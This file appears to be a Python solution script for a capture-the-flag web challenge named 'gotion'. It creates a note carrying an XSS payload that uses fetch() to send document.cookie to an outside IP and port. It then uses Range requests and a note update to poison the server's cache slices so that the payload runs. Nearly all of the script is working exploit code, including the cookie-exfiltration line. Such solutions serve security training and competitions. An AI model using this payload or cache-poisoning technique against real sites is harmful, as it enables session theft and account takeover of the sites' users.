import requests

# host = "http://82.157.252.61:30080"
host = "http://gotion.chal.ctf.acsc.asia"
XSS_payload = "img onerror=fetch(`//82.157.252.61:2333/?${document.cookie}`) src=x:".ljust(87, ' ')

path = requests.post(
    f"{host}/new-note",
    data={
        "title": "mp4".rjust(20, 'a'),
        "body": "x" * (1024 - len(XSS_payload)) + XSS_payload,
    },
    allow_redirects=False, #! Forbidden redirect
).headers["Location"]
note_id = path.split("/")[-1]

#! Cache the second slice start with XSS payload
r = requests.get(f"{host}{path}", headers={"Range": "bytes=4096-"}) #! cache the second slice
print(r.headers)
print(r.text) #! the last word must be "i"

requests.post(
    f"{host}/update-note",
    data={
        "noteId": note_id,
        "title": "mp4",
        "body": "x" * 946,
    },
    allow_redirects=False,
)

r = requests.get(f"{host}{path}", headers={"Range": "bytes=-4095"}) #! cache the first slice and ended with "<"
print(r.headers)
print(r.text)


r = requests.get(f"{host}{path}")
print(r.headers)
print(r.text)

print(f"{host}{path}")